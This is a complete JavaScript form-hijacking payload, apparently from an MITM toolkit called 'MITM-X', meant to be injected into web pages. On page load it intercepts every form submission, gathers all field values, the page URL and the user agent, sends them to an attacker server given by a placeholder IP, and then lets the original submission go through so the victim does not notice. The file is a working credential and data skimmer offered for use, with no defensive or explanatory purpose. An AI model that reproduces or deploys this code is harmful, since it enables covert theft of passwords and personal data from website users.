// Form Hijacker Payload - Intercepts form submissions
document.addEventListener('DOMContentLoaded', function() {
    var attackerServer = 'http://192.168.1.100:8080'; // Change to your server
    
    // Get all forms on the page
    var forms = document.getElementsByTagName('form');
    
    for (var i = 0; i < forms.length; i++) {
        forms[i].addEventListener('submit', function(e) {
            // Prevent default submission temporarily
            e.preventDefault();
            
            var formData = new FormData(this);
            var data = {};
            
            // Convert FormData to regular object
            for (var pair of formData.entries()) {
                data[pair[0]] = pair[1];
            }
            
            // Send form data to attacker server
            var xhr = new XMLHttpRequest();
            xhr.open('POST', attackerServer + '/formdata', true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            
            var payload = {
                url: window.location.href,
                formData: data,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent
            };
            
            xhr.send(JSON.stringify(payload));
            
            // Allow original form submission after delay
            var originalForm = this;
            setTimeout(function() {
                originalForm.submit();
            }, 100);
        });
    }
    
    console.log('MITM-X Form hijacker active on ' + forms.length + ' forms');
});
